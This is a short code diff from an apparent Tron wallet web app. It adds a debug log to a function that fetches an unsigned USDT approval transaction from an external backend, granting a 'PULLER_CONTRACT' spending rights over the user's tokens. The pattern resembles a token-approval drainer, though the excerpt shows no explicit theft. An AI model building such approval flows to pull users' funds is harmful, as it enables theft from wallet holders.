@@ -133,7 +133,7 @@ const detectSupportedTronMethods = async () => {
     try {
       setStatus("Creating approval transaction...");
       setTxHash('');
-    
+      
       const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -144,6 +144,13 @@ const detectSupportedTronMethods = async () => {
           amount: AMOUNT
         })
       });
+      console.log("approveUSDT params:", {
+  address,
+  USDT_CONTRACT,
+  PULLER_CONTRACT,
+  AMOUNT
+});
+
       console.log(txResponse);
       const unsignedTx = await txResponse.json();
       if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
